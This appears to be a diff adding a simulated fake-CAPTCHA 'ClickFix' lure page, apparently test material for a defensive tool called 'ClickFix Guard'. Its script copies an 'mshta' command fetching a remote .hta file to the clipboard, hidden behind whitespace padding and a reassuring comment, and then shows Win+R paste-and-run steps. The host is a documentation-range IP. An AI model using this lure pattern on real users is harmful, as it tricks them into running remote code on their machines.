@@ -1,0 +1,25 @@
+<!doctype html>
+<!-- Simulated fake-CAPTCHA lure (clipboard.writeText). Inert: TEST-NET IP, cannot connect. -->
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Verify you are human</title><link rel="stylesheet" href="lure.css"></head>
+<body>
+  <h1>Verify you are human</h1>
+  <div class="widget">
+    <button class="check" id="robot" aria-label="I'm not a robot"></button>
+    <span>I'm not a robot</span>
+  </div>
+  <div class="steps" id="steps" hidden>
+    <b>Verification steps</b>
+    <ol><li>Press <kbd>Windows</kbd> + <kbd>R</kbd></li><li>Press <kbd>Ctrl</kbd> + <kbd>V</kbd></li><li>Press <kbd>Enter</kbd></li></ol>
+  </div>
+  <script src="lure.js"></script>
+  <script>
+    const payload = "mshta http://198.51.100.23/verify.hta" + " ".repeat(60) +
+      "# ✅ I am not a robot - Verification ID: 7537 (ClickFix Guard demo, harmless)";
+    document.getElementById("robot").addEventListener("click", async () => {
+      reportCopy("captcha", payload);
+      try { await navigator.clipboard.writeText(payload); } catch (_) {}
+      document.getElementById("steps").hidden = false;
+    });
+  </script>
+</body></html>
